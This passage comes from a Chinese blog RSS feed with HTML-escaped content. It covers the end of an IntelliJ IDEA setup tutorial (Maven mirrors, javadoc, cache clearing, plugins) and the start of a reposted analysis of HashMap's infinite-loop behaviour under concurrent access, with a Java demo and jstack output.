class=&quot;hljs-name&quot;&gt;url&lt;/span&gt;&amp;gt;&lt;/span&gt;http://repo2.maven.org/maven2/&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;url&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;mirrorOf&lt;/span&gt;&amp;gt;&lt;/span&gt;central&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;mirrorOf&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;mirror&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;......&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Maven -&amp;gt; Importing&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjmiq.png&quot; alt=&quot;&quot;/&gt;&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;Import Maven projects automatically：表示 IntelliJ IDEA 会实时监控项目的 pom.xml 文件，进行项目变动设置，&lt;code&gt;建议勾选&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;Automatically download：在 Maven 导入依赖包的时候是否自动下载源码和文档。默认是没有勾选的，也&lt;code&gt;不建议勾选&lt;/code&gt;，原因是这样可以加快项目从外网导入依赖包的速度，如果我们需要源码和文档的时候我们到时候再针对某个依赖包进行联网下载即可。IntelliJ IDEA 支持直接从公网下载源码和文档的。&lt;/li&gt;
&lt;li&gt;VM options for importer：可以设置导入的 VM 参数。&lt;code&gt;一般这个都不需要主动改&lt;/code&gt;，除非项目真的导入太慢了我们再增大此参数。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3 id=&quot;h3maven&quot;&gt;&lt;span&gt;&lt;strong&gt;3. 演示使用Maven&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;创建对应的 Module&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjYhd.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;选择Spring Boot 的模板 Spring Initializr&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjVme.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;举例：此时 Spring Initalizr 是 springboot 工程的模板。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jj0NR.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;Group：组织或公司域名，倒序&lt;br/&gt;Artifact：项目模块名称&lt;br/&gt;Version：默认 maven 生成版本：0.0.1-SNAPSHOT&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjjKi.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;这里可以暂时先不选，后面开发需要了再进行设置。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjdpY.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【finish】 即可完成创建。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjWDr.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;创建完成以后，可以在 IDEA 右边看到创建的 Module。如果没有，可以刷新一下。目录下也会有对应的生命周期。其中常用的是：clean、compile、package、install。比如这里install，如果其他项目需要将这里的模块作为依赖使用，那就可以install。安装到本地仓库的位置。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjGoy.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;本地仓库中的文件截图：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjOdX.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;其他操作这里不再赘述。
&lt;h2 id=&quot;h-4&quot;&gt;&lt;span&gt;&lt;strong&gt;十三、其它设置&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1javadoc&quot;&gt;&lt;span&gt;&lt;strong&gt;1.生成 javadoc&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjbrl.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;填写生成javadoc的项目或者模块、输出位置、语言、编码等&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjpxJ.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;Locale：输入语言类型：zh_CN&lt;br/&gt;Other command line arguments：-encoding UTF-8 -charset UTF-8&lt;br/&gt;出现错误：未知标记：date 如下图：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jj4h6.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;解决方法:&lt;br/&gt;Other command line arguments：-encoding UTF-8 -charset UTF-8 -tag date:a:&quot;date&quot;
&lt;h3 id=&quot;h2-7&quot;&gt;&lt;span&gt;&lt;strong&gt;2. 缓存和索引的清理&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;IntelliJ IDEA 首次加载项目的时候，都会创建索引&lt;/code&gt;，而创建索引的时间跟项目的文件多少成正比。在 IntelliJ IDEA 创建索引过程中即使你编辑了代码也是编译不了、运行不起来的，所以还是安安静静等 IntelliJ IDEA 创建索引完成。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IntelliJ IDEA 的缓存和索引主要是用来加快文件查询，从而加快各种查找、代码提示等操作的速度&lt;/code&gt;，所以 IntelliJ IDEA 的索引的重要性再强调一次也不为过。但是，IntelliJ IDEA 的索引和缓存并不是一直会良好地支持 IntelliJ IDEA 的，某些特殊条件下，IntelliJ IDEA 的缓存和索引文件也是会损坏的，比如：断电、蓝屏引起的强制关机，当你重新打开 IntelliJ IDEA，很可能 IntelliJ IDEA 会报 各种莫名其妙错误，甚至项目打不开，IntelliJ IDEA 主题还原成默认状态。即使没有断电、蓝屏，也会有莫名奇怪的问题的时候，也很有可能是 IntelliJ IDEA 缓 存和索引出现了问题，这种情况还不少。遇到此类问题也不用过多担心。我们可以清理缓存和索引。如下：&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjuzB.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击第一个按钮&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjJkp.png&quot; alt=&quot;&quot;/&gt;&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;一般建议点击 Invalidate and Restart，这样会比较干净。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;上图警告：清除索引和缓存会使得 IntelliJ IDEA 的 Local History 丢失。所以如果你项目没有加入到版本控制，而你又需要你项目文件的历史更改记录，那你最好备份下你的 LocalHistory 目录。&lt;br/&gt;目录地址在：C:\Users\当前登录的系统用户名.IntelliJIdea14\system\LocalHistory 建议使用硬盘的全文搜索，这样效率更高。&lt;/li&gt;
&lt;li&gt;&lt;span&gt;通过上面方式清除缓存、索引本质也就是去删除 C 盘下的 system 目录下的对应的文件而已，所以如果你不用上述方法也可以删除整个 system。当 IntelliJ IDEA 再次启动项目的时候会重新创建新的 system 目录以及对应项目缓存和索引。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3 id=&quot;h3-5&quot;&gt;&lt;span&gt;&lt;strong&gt;3. 取消更新&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;取消勾选：即可取消更新&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjhB3.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h4-4&quot;&gt;&lt;span&gt;&lt;strong&gt;4. 插件的使用&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;在 IntelliJ IDEA 的安装讲解中我们其实已经知道，IntelliJ IDEA 本身很多功能也都是通过插件的方式来实现的。&lt;br/&gt;官网插件库：&lt;a href=&quot;https://plugins.jetbrains.com/&quot; target=&quot;_blank&quot;&gt;https://plugins.jetbrains.com/&lt;/a&gt;&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjrCQ.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;在IDEA中是打开Settings&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjvpK.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;需要特别注意的是：在国内的网络下，经常出现显示不了插件列表，或是显示了插件列表，无法下载完成安装。这时候请自行打开 VPN，一般都可以得到解决。&lt;br/&gt;演示安装GsonFormat&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjy1G.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;如下图演示，在线安装 IntelliJ IDEA 插件库中的插件。安装完以后会提示重启，才可以使用插件。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjPon.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;常用插件推荐：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjcdE.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;h-5&quot;&gt;&lt;span&gt;&lt;strong&gt;十四、资料附录&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;　　最新尚硅谷Java开发利器：IntelliJ IDEA的安装、配置与使用&lt;br/&gt;　　链接：&lt;a href=&quot;https://pan.baidu.coms/11biVBv9EI9yfL6Cee0r0LQ&quot; target=&quot;_blank&quot;&gt;https://pan.baidu.coms/11biVBv9EI9yfL6Cee0r0LQ&lt;/a&gt; 密码：n7hn&lt;/p&gt;
</description>
<pubDate>Fri, 18 Jan 2019 15:27:00 +0000</pubDate>
<dc:creator>黑泽君</dc:creator>
<og:description>一、IntelliJ IDEA 介绍 -&gt; Eclipse IBM 1. JetBrains 公司介绍 IDEA(https://www.jetbrains.com/idea/)是 JetBra</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/chenmingjun/p/10290183.html</dc:identifier>
</item>
<item>
<title>HashMap多线程并发问题分析 - 羽落风痕</title>
<link>http://www.cnblogs.com/lan-ge/p/10290169.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lan-ge/p/10290169.html</guid>
<description>&lt;blockquote&gt;
&lt;h4&gt;目录&lt;/h4&gt;
&lt;a href=&quot;https://www.cnblogs.com/andy-zhou/p/5402984.html#_caption_0&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;并发问题的症状&lt;/strong&gt;&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/andy-zhou/p/5402984.html#_caption_1&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;HashMap数据结构&lt;/strong&gt;&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/andy-zhou/p/5402984.html#_caption_2&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;HashMap的rehash源代码&lt;/strong&gt;&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/andy-zhou/p/5402984.html#_caption_3&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;正常的ReHash过程&lt;/strong&gt;&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/andy-zhou/p/5402984.html#_caption_4&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;并发的Rehash过程&lt;/strong&gt;&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/andy-zhou/p/5402984.html#_caption_5&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;三种解决方案&lt;/strong&gt;&lt;/a&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;转载-hashmap多线程并发问题分析&quot;&gt;转载: &lt;a href=&quot;http://my.oschina.net/xianggao/blog/393990?fromerr=OPResiVf&quot; target=&quot;_blank&quot;&gt;HashMap多线程并发问题分析&lt;/a&gt;&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;并发问题的症状&quot;&gt;并发问题的症状&lt;/h2&gt;
&lt;h4 id=&quot;多线程put后可能导致get死循环&quot;&gt;多线程put后可能导致get死循环&lt;/h4&gt;
&lt;p&gt;从前我们的Java代码因为一些原因使用了HashMap这个东西，但是当时的程序是单线程的，一切都没有问题。后来，我们的程序性能有问题，所以需要变成多线程的，于是，变成多线程后到了线上，发现程序经常占了100%的CPU，查看堆栈，你会发现程序都Hang在了HashMap.get()这个方法上了，重启程序后问题消失。但是过段时间又会来。而且，这个问题在测试环境里可能很难重现。&lt;/p&gt;
&lt;p&gt;我们简单的看一下我们自己的代码，我们就知道HashMap被多个线程操作。而Java的文档说HashMap是非线程安全的，应该用ConcurrentHashMap。但是在这里我们可以来研究一下原因。简单代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cs&quot;&gt;package com.king.hashmap;

import java.util.HashMap;

&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;class &lt;span class=&quot;hljs-title&quot;&gt;TestLock {

    &lt;span class=&quot;hljs-keyword&quot;&gt;private HashMap map = &lt;span class=&quot;hljs-keyword&quot;&gt;new HashMap();

    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-title&quot;&gt;TestLock(&lt;span class=&quot;hljs-params&quot;&gt;) {
        Thread t1 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.put(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i), i);
                }
                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t1 over&quot;);
            }
        };

        Thread t2 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.put(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i), i);
                }

                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t2 over&quot;);
            }
        };

        Thread t3 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.put(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i), i);
                }

                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t3 over&quot;);
            }
        };

        Thread t4 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.put(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i), i);
                }

                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t4 over&quot;);
            }
        };

        Thread t5 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.put(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i), i);
                }

                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t5 over&quot;);
            }
        };

        Thread t6 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.&lt;span class=&quot;hljs-keyword&quot;&gt;get(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i));
                }

                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t6 over&quot;);
            }
        };

        Thread t7 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.&lt;span class=&quot;hljs-keyword&quot;&gt;get(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i));
                }

                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t7 over&quot;);
            }
        };

        Thread t8 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.&lt;span class=&quot;hljs-keyword&quot;&gt;get(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i));
                }

                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t8 over&quot;);
            }
        };

        Thread t9 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.&lt;span class=&quot;hljs-keyword&quot;&gt;get(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i));
                }

                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t9 over&quot;);
            }
        };

        Thread t10 = &lt;span class=&quot;hljs-keyword&quot;&gt;new Thread() {
            &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;run(&lt;span class=&quot;hljs-params&quot;&gt;) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-keyword&quot;&gt;int i = &lt;span class=&quot;hljs-number&quot;&gt;0; i &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;50000; i++) {
                    map.&lt;span class=&quot;hljs-keyword&quot;&gt;get(&lt;span class=&quot;hljs-keyword&quot;&gt;new Integer(i));
                }

                System.&lt;span class=&quot;hljs-keyword&quot;&gt;out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;t10 over&quot;);
            }
        };

        t1.start();
        t2.start();
        t3.start();
        t4.start();
        t5.start();

        t6.start();
        t7.start();
        t8.start();
        t9.start();
        t10.start();
    }

    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;static &lt;span class=&quot;hljs-keyword&quot;&gt;void &lt;span class=&quot;hljs-title&quot;&gt;main(&lt;span class=&quot;hljs-params&quot;&gt;String[] args) {
        &lt;span class=&quot;hljs-keyword&quot;&gt;new TestLock();
    }
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;就是启了10个线程，不断的往一个非线程安全的HashMap中put内容/get内容，put的内容很简单，key和value都是从0自增的整数（这个put的内容做的并不好，以致于后来干扰了我分析问题的思路）。对HashMap做并发写操作，我原以为只不过会产生脏数据的情况，但反复运行这个程序，会出现线程t1、t2被hang住的情况，多数情况下是一个线程被hang住另一个成功结束，偶尔会10个线程都被hang住。&lt;/p&gt;
&lt;p&gt;产生这个死循环的根源在于对一个未保护的共享变量 — 一个&quot;HashMap&quot;数据结构的操作。当在所有操作的方法上加了&quot;synchronized&quot;后，一切恢复了正常。这算jvm的bug吗？应该说不是的，这个现象很早以前就报告出来了。Sun的工程师并不认为这是bug，而是建议在这样的场景下应采用&quot;ConcurrentHashMap”，&lt;/p&gt;
&lt;p&gt;CPU利用率过高一般是因为出现了出现了死循环，导致部分线程一直运行，占用cpu时间。问题原因就是HashMap是非线程安全的，多个线程put的时候造成了某个key值Entry key List的死循环，问题就这么产生了。&lt;/p&gt;
&lt;p&gt;当另外一个线程get 这个Entry List 死循环的key的时候，这个get也会一直执行。最后结果是越来越多的线程死循环，最后导致服务器dang掉。我们一般认为HashMap重复插入某个值的时候，会覆盖之前的值，这个没错。但是对于多线程访问的时候，由于其内部实现机制(在多线程环境且未作同步的情况下，对同一个HashMap做put操作可能导致两个或以上线程同时做rehash动作，就可能导致循环键表出现，一旦出现线程将无法终止，持续占用CPU，导致CPU使用率居高不下)，就可能出现安全问题了。&lt;/p&gt;
&lt;p&gt;使用jstack工具dump出问题的那台服务器的栈信息。死循环的话，首先查找RUNNABLE的线程，找到问题代码如下：&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;java.lang.Thread.State:RUNNABLE&lt;br/&gt;at java.util.HashMap.get(HashMap.java:303)&lt;br/&gt;at com.sohu.twap.service.logic.TransformTweeter.doTransformTweetT5(TransformTweeter.java:183)&lt;br/&gt;共出现了23次。&lt;br/&gt;java.lang.Thread.State:RUNNABLE&lt;br/&gt;at java.util.HashMap.put(HashMap.java:374)&lt;br/&gt;at com.sohu.twap.service.logic.TransformTweeter.transformT5(TransformTweeter.java:816)&lt;br/&gt;共出现了3次。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意：不合理使用HashMap导致出现的是死循环而不是死锁。&lt;/p&gt;
&lt;h3 id=&quot;多线程put的时候可能导致元素丢失&quot;&gt;多线程put的时候可能导致元素丢失&lt;/h3&gt;
&lt;p&gt;主要问题出在addEntry方法的new Entry (hash, key, value, e)，如果两个线程都同时取得了e,则他们下一个元素都是e，然后赋值给table元素的时候有一个成功有一个丢失。&lt;/p&gt;
&lt;h3 id=&quot;put非null元素后get出来的却是null&quot;&gt;put非null元素后get出来的却是null&lt;/h3&gt;
&lt;p&gt;在transfer方法中代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs vbscript&quot;&gt;void transfer(Entry[] newTable) {
    Entry[] src = table;
    &lt;span class=&quot;hljs-built_in&quot;&gt;int newCapacity = newTable.length;
    &lt;span class=&quot;hljs-keyword&quot;&gt;for (&lt;span class=&quot;hljs-built_in&quot;&gt;int j = &lt;span class=&quot;hljs-number&quot;&gt;0; j &amp;lt; src.length; j++) {
